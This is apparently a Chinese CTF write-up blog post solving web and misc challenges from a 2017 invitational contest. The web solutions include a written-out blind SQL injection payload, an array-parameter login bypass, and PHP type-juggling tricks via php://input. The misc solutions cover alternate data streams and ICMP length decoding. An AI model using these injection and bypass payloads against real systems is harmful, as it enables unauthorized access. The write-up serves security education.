---
comments: false
title: 美亚柏科邀请赛2017
tags: [ctf]
date: 2017-12-23 20:36:25
categories: writeup
description: 美亚柏科邀请赛2017

---

## web

#### web2

> Flag在哪里?
>
> 链    接 http://10sBB7f7sSo9.isec.anscen.cn

burp抓包后向login.php常规 post `user[]=admin&pass[]=a&submit=submit`  。 得到`flag{7538a033d41f442cbae9578d4c189615}`  。

#### web4

> 你找得到Flag吗？
>
> 链    接http://3jhg9aks3.isec.anscen.cn

- fuzz发现某些响应包头部会多出`Set-Cookie: remind=U1FMSQ%3D%3D;` 字样，依此进行盲注。
- 使用intruder自动化，攻击向量为`content=b'||substr((select/**/hex(database())),1,1)='6'#` 
- 处理得到flag

```python
r='p'+'x'*100
r=[i for i in r]
c0=[32,42]
c1=[6,18,30,70,72,76]
c2=[40,60]
c3=[11,15,21,23,25,31,33,35,37,38,41,43,45,49,51,54,57,61,65,67,73,74,75]
c4=[14,20,56]
c5=[16,28,36,46,48,68]
c6=[1,2,3,5,7,13,17,19,22,27,29,39,44,47,53,55,59,63,64,69,71]
c7=[8,9,12,24,52,62,77]
c8=[26,50,58]
c9=[34,66]
ca=[]
cb=[10]
cc=[4]
cd=[78]
ce=[]
cf=[]

call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf]
for i in xrange(len(call)):
	for j in call[i]:
		r[j]=hex(i)[2:]
print ''.join(r)
#666c61677b3764356164363738656130393533623036356538376364386237663935616133317d
#flag{7d5ad678ea0953b065e87cd8b7f95aa31}
```

#### web5

> 还没找到flag么
>
> 链	接http://8ah3ka0akj.isec.anscen.cn

查看源码，循序渐进。

```php
view-source://http://8ah3ka0akj.isec.anscen.cn/?key1=php://input&key2=skwerl11&key3=665.99999999999999&key4=99999999999999999999999999999999999999
post Hello hacker!
-----------------------------------------------------------------------
Hello hacker! Do you want the flag?<br>
<!--
	$k1=$_GET['key1'];
	$k2=$_GET['key2'];
	if(file_get_contents($k1)==="Hello hacker!"){
		echo 'welcome! Hacker!<br>';
	}
-->sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
welcome! Hacker!<br><!--
		if(md5($k2)>666666*666666)
		{
			include('ctf.php'); 
		}
-->
Come on, flag is coming<br>flag{0fd14555a5d275b253aff1bae158ca7c}<!--
		$k3=$_GET['key3'];
		$k4=$_GET['key4'];
		if(intval($k3)<666)
		{
			if($k3==666)
			{
				echo 'Come on, flag is coming<br>';
				if($k4>0)
				{
					if(intval($k3+$k4)<666)
						echo $flag;
				}
			}
		}
-->

```

### MISC

#### MISC4

> 到底什么才是打开flag的正确姿势？
>
> 链    接http://1e3g6S39v5M9.isec.anscen.cn

解压`Misc_Flow.rar` 得到`flag.rar` 和`Hints.txt` 两个文件，其中`hint.txt` 提示`Blasting code???No No No!There is another txt file.` ，尝试用`alternatestreamview.exe` 扫描文件夹，得到隐藏的流文件`:password.txt:$DATA` ，提取出内容是`c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad` 。

发现`flag.rar` 无法作为压缩包打开，修复文件头为正确的`52617221` 后将上面字符串作为密码即可打开，得到包含flag的图片。`flag{43cca4b3de2097b9558efefb0ecc3588}` 

#### MISC5

> 截获了一份敌军的流量包，据悉暗号就在里面
>
> 链    接http://2S8h7F84v4M0.isec.anscen.cn

过滤出ICMP包，按顺序排列，发现数据包长度可疑。

```python
a=[144,150,139,145,165,91,109,151,122,113,106,119,93,167]
print ''.join([chr(i-42) for i in a])
# flag{1CmPG@M3}
```